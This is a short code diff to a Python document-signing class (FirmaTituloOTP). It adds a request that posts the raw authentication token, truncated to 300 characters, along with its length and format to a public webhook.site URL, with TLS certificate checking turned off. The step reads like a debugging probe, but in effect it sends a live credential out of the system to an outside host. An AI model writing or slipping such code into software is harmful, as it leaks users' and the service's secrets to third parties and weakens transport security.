@@ -50,7 +50,7 @@ class FirmaTituloOTP(DocumentOperation):
     configuration_parameters = {}
     _logger: SpLogger = SpLogger("athentose", "FirmaTituloOTP")
 
-    url = "https://webhook.site/5b8e70e2-bee5-49ee-9f9a-c7f941188fbc"
+    url = "https://webhook.site/2d7dd112-203a-479c-9eb7-ea6a3a0bf7f7"
 
     def execute(self, *args, **kwargs):  # noqa: D401
         flogger: SpFeatureLogger = NullSpFeatureLogger()
@@ -129,6 +129,18 @@ class FirmaTituloOTP(DocumentOperation):
                 flogger.entry("Error al obtener auth_token: " + str(err_msg))
                 flogger.entry("Traceback: " + traceback.format_exc())
                 raise
+
+            requests.post(
+                self.url,
+                json={
+                    "paso": "token",
+                    "token_raw": auth_token[:300],
+                    "token_len": len(auth_token),
+                    "es_json": auth_token.strip().startswith("{"),
+                    "es_jwt": auth_token.strip().startswith("eyJ"),
+                },
+                verify=False,
+            )
 
             fil_padre.set_feature("obtuve_auth_token", "1")
 
